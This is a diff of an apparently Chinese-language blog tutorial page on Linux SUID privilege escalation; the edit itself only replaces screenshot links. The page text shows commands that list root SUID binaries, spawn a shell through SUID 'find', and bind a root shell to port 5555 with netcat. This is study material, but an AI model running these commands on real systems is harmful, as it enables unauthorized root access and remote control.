@@ -186,9 +186,8 @@ find / -user root -perm -4000 -print 2&gt;/dev/null
 
 find / -user root -perm -4000 -exec ls -ldb { }</code></pre><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><pre><code>ls -al /usr/bin/find
 -rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><p>定位到tmp目录下，touch（创建）一个aaa文件</p>
-<p><img src="https://sipcoj.com/images/2020/11/15/QQ20200904165147.jpg" srcset="/img/loading.gif" alt="QQ20200904165147.jpg"></p>
-<pre><code>find aaa -exec &#39;/bin/sh&#39; \;</code></pre><p><img src="https://sipcoj.com/images/2020/11/15/QQ20200904165245.jpg" srcset="/img/loading.gif" alt="QQ20200904165245.jpg"></p>
-<p>大部分Linux 系统都安装了nc。使用</p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192321.jpg" srcset="/img/loading.gif" alt=""></p>
+<pre><code>find aaa -exec &#39;/bin/sh&#39; \;</code></pre><p>大部分Linux 系统都安装了nc。使用</p>
 <p><code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code></p>
 <p> 即可成功反弹root shell</p>
 
